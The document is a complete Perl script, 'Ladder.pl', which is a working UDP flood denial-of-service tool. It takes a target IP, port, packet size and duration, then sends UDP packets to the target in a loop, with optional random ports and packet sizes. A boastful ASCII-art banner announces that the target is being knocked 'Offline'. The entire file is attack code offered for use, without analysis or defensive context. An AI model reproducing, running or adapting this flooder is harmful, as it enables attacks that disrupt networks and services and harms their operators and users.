#!/usr/bin/perl

##
# NikeiDs
##

use Socket;
use strict;

if($#ARGV != 3) {
 print " Ladder.pl <ip> <port> <size> <time> \n\n";
 print " port=0 use random ports\n";
 print " size=0 use size between 64 and 1024\n";
 print " time=0 use continueous flood\n";
 exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;
             ,gaaaaaaaagaaaaaaaaaaaaagaaaaaaaag,
           ,aP8b    _,dYba,       ,adPb,_    d8Ya,
         ,aP"  Yb_,dP"   "Yba, ,adP"   "Yb,_dP  "Ya,
       ,aP"    _88"         )888(         "88_    "Ya,
     ,aP"   _,dP"Yb      ,adP"8"Yba,      dP"Yb,_   "Ya,
   ,aPYb _,dP8    Yb  ,adP"   8   "Yba,  dP    8Yb,_ dPYa,
 ,aP"  YdP" dP     YbdP"      8      "YbdP     Yb "YbP  "Ya,
I8aaaaaa8aaa8baaaaaa88aaaaaaaa8aaaaaaaa88aaaaaad8aaa8aaaaaa8I
`Yb,   d8a, Ya      d8b,      8      ,d8b      aP ,a8b   ,dP'
  "Yb,dP "Ya "8,   dI "Yb,    8    ,dP" Ib   ,8" aP" Yb,dP"
    "Y8,   "YaI8, ,8'   "Yb,  8  ,dP"   `8, ,8IaP"   ,8P"
      "Yb,   `"Y8ad'      "Yb,8,dP"      `ba8P"'   ,dP"
        "Yb,    `"8,        "Y8P"        ,8"'    ,dP"
          "Yb,    `8,         8         ,8'    ,dP"
            "Yb,   `Ya        8        aP'   ,dP"
              "Yb,   "8,      8      ,8"   ,dP"
                "Yb,  `8,     8     ,8'  ,dP"   
                  "Yb, `Ya    8    aP' ,dP"     
                    "Yb, "8,  8  ,8" ,dP"
                      "Yb,`8, 8 ,8',dP"
                        "Yb,Ya8aP,dP"
                          "Y88888P"
                            "Y8P"
                              "
 DMND - Powerful: Crxck Runs Your Shit !!
EOTEXT

print "!~Crxck~! $ip " . ($port ? $port : "random") . " Offline " .
  ($size ? "$size " : "VaMpirE") . "!~DISCONECTED~! " .
  ($time ? " for $time seconds" : "") . "\n";
print "Stop Hitting Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
